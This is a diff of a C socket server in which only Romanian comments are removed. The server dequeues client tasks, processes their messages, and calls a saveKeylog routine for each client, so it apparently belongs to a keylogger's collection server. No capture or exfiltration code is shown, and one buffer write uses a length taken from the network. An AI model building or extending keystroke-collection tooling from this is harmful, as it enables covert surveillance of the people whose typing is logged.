@@ -14,7 +14,7 @@
 #include <time.h>
 
 extern clientHandler_t clientHndler;
-extern task_queue_t taskQueue; // Coada de task-uri
+extern task_queue_t taskQueue; 
 
 void saveKeylog(int client_sock)
 {
@@ -126,24 +126,24 @@ void *handle_client(void *params)
 {
     while (1)
     {
-        // Scoatem un task din coadă
+        
         task_t task = dequeueTask(&taskQueue);
 
         int client_sock = task.client_sock;
         message_t client_message;
         int read_size;
 
-        // Procesăm mesajele clientului
+        
         while ((read_size = recv(client_sock, &client_message, sizeof(client_message), 0)) > 0)
         {
             client_message.buffer[client_message.size] = '\0';
             handleOpcode(client_message, client_sock);
         }
 
-        // Salvăm fișierul de keylog (cod refactorizat într-o funcție separată)
+        
         saveKeylog(client_sock);
 
-        // Scoatem clientul din lista de clienți activi
+        
         pthread_mutex_lock(&clientHndler.mutex);
         for (int i = 0; i < clientHndler.numberClients; i++)
         {
